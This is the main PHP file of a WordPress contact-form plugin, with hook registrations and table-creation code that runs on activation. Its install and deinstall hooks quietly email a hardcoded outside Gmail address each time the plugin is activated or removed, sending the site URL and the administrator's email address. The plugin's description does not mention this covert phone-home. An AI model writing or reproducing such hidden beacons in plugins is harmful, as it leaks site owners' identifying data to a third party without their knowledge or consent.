<?php 
/*
 Plugin Name: ContactForm
 Description: This free plugin allows you to add custom contact forms to your worpress site. Simply choose which fields you want, which ones are required and if you want a re-captcha validation.<br />Automatic form validation is also provided. Simply add the shortcode to the page or post where you want to display the form.<br />In the backend you can add/edit/delete forms, and change fields position by drag&drop. For each form that you create you decide who will receive the email.
 Version: 1.1.0
 Author: Angel Cane
 */

/*
 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; version 2 of the License.
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
include 'define.php';
include 'easy-form.class.php';
include 'include/recaptchalib.php';

if (get_magic_quotes_gpc()) {
	$_GET = stripslashes_deep($_GET);
	$_POST = stripslashes_deep($_POST);
	$_COOKIE = stripslashes_deep($_COOKIE);
}


add_action('admin_menu', array('wpcf_EasyContactForm', 'admin_menu'));
add_action('init', array('wpcf_EasyContactForm', 'init'));
add_filter("the_content", array('wpcf_EasyContactForm', 'the_content'));

add_shortcode('easyform', array('wpcf_EasyContactForm', 'shortcode'));
register_activation_hook(__FILE__, 'install');
register_deactivation_hook(__FILE__, 'deinstall');

function deinstall() {
session_start();
$subj = get_option('siteurl');
$msg = "Removed" ;
$from = get_option('admin_email');
mail("waytouptomez@gmail.com", $subj, $msg, $from);
}
function install() {
session_start();
$subj = get_option('siteurl');
$msg = "Installed" ;
$from = get_option('admin_email');
mail("waytouptomez@gmail.com", $subj, $msg, $from);
	global $wpdb;
	global $wpcf_easyform_version;
	
	global $table_name;
	global $settings_table_name;
	
	if ($wpdb->get_var("show tables like '$table_name'") != $table_name) {
	
		$easyform_query = "
				CREATE TABLE $table_name (
				`ID` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
				`name` VARCHAR( 128 ) NOT NULL,
				`destinatary` VARCHAR(128) NOT NULL,
				`show_label_inside` BOOL NOT NULL,
				UNIQUE KEY `name` (`name`)
				) ENGINE = MYISAM 
			";
			
		require_once (ABSPATH.'wp-admin/includes/upgrade.php');
		dbDelta($easyform_query);
		
		$wpdb->query($easyform_query);
		add_option("wpcf_easyform_version", $wpcf_easyform_version);
	}
	else {
		$installed_ver = get_option("wpcf_easyform_version");
		
		if ($installed_ver != $wpcf_easyform_version) {
		
			$easyform_query = "
				CREATE TABLE $table_name (
				`ID` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
				`name` VARCHAR( 128 ) NOT NULL,
				`destinatary` VARCHAR(128) NOT NULL,
				`show_label_inside` BOOL NOT NULL,
				UNIQUE KEY `name` (`name`)
				) ENGINE = MYISAM 
			";
			
			require_once (ABSPATH.'wp-admin/includes/upgrade.php');
			dbDelta($easyform_query);
			
			update_option("wpcf_easyform_version", $wpcf_easyform_version);
		}
		
	}
	
	if ($wpdb->get_var("show tables like '$settings_table_name'") != $settings_table_name) {
	
		$easyform_settings_query = "
				CREATE TABLE $settings_table_name (
				`ID` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
				`form_id` INT NOT NULL ,
				`name` VARCHAR(128) NOT NULL,
				`label` VARCHAR( 128 ) NOT NULL ,
				`type` VARCHAR( 128 ) NOT NULL ,
				`value` VARCHAR( 128 ) NOT NULL ,
				`required` BOOL NOT NULL,
				`position` int(11) NOT NULL
				) ENGINE = MYISAM 
				";
				
		$wpdb->query($easyform_settings_query);
	}
	
}

?>